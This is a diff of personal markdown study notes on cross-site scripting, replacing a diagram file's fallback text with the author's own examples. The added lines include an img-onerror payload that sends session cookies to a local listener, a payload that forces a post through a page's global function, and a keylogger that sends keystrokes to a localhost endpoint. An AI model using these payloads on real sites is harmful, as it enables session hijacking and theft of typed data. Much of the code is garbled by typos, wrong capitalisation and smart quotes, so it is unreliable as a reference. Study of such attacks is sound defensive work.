@@ -1,13 +1,11 @@
 What it is: XSS happens when an attacker injects malicious JavaScript into a web page that runs in other users’ browsers.
 
-once user is able to run script he can any kind of data cookie, keystrokes 
+once user is able to run script he can any kind of data cookie, keystrokes.
 
+may be attacker will create malicious link, encode it and create tiny url.
+for eg tiny url of stelaing instagram cookie.
 
 # XSS Attack Diagram
-
-Below is a simple diagram (Mermaid + ASCII fallback) that explains the basic flow of a client-side XSS attack.
-
----
 
 ## Mermaid diagram (use on GitHub / Mermaid-enabled viewers)
 
@@ -22,43 +20,49 @@ flowchart TD
   Website -->|3️⃣ Sends stolen cookies / credentials| Attacker
 ```
 
----
 
-## ASCII fallback (works in any Markdown viewer)
+ Vulnerability - User Session hijacking, Unauthorised activities, Capturing Keystrokes, Stealing Critical Information (take screenshots, chat), Phishing attack (how?)
 
-```
-+----------+            1) Injects malicious script          +-----------+
-| Attacker | -----------------------------------------------> | Website   |
-+----------+                                                  +-----------+
-                                                                  ^
-                                                                  |
-                                                                  | 2) Victim visits; script runs in victim's browser
-                                                                  |
-                                                           +-------------+
-                                                           | Victim User |
-                                                           +-------------+
-                                                                  |
-                                                                  | 3) Script steals cookies/credentials and sends to attacker
-                                                                  v
-+----------+ <--------------------------------------------------------------+
-| Attacker |                                                                |
-+----------+                                                                |
-                                                                            |
-```
+Now a days new brosers are smart enough that do not allow this but still.
 
----
 
-## How to use
+- User Session hijacking 
 
-* If your viewer supports Mermaid, the Mermaid block will render a clean diagram.
-* If not, the ASCII fallback shows the same flow and can be copied as plain text.
+malicious link example -->  ?name=<img src="does-not-exhist" onerror="var img = document.createElement(\'img.src=\"http://127.0.0.1:5501/cookie?data=\'+document.cookie;document.querySelector(\"body\").append(img)
 
----
+this link will genrate will create image src on via url and underthe hood run js, and js will steal the cookie.
+once cookier is stolen (write what could go wrong)
 
-## Raw Markdown (copy the whole file)
+- Unauthorised activities
+imagine you are having facebook like website which postsomething. and you have written global method. and it is directly visible.
 
-If you want a single copyable chunk, copy everything in this file. It already *is* a ready-to-save `.md` file.
+means you can access. window.createPost(); 
+but now what could go wrong here.
 
----
+take back malicous link example again
+malicious link example -->  ?name=<img src="does-not-exhist" onerror="createPost("Hack title","hack description" />
 
-*If you want modifications (labels, colors, or additional steps like "Payload delivered via comment field" or "Stored vs Reflected XSS"), tell me what to change and I will update the file.*
+once vivek click on that link, post has made, user might not have any idea what he has posted.
+
+ - Capturing Keystrokes
+
+
+ // Code  var timeout var buffer = ‘’l
+Document.querySelectort(‘body’).addEventlistener(‘keypress’, function(event) {  if (event.which !== 0) { clearTimeout(timeout); buffer+=String.fromCharCode(event.which); timeoout=setTimeout(function() {
+Var xor = new XMLHttpRequest(); var uri = ‘http://localhost:3001/keys?data='+encodeURIComponent
+xhr.open(‘GET’, uri)l
+xhr.send();
+Buffer = ‘’;
+}, 400); }
+});
+
+// 22.20
+
+
+
+
+
+
+
+
+
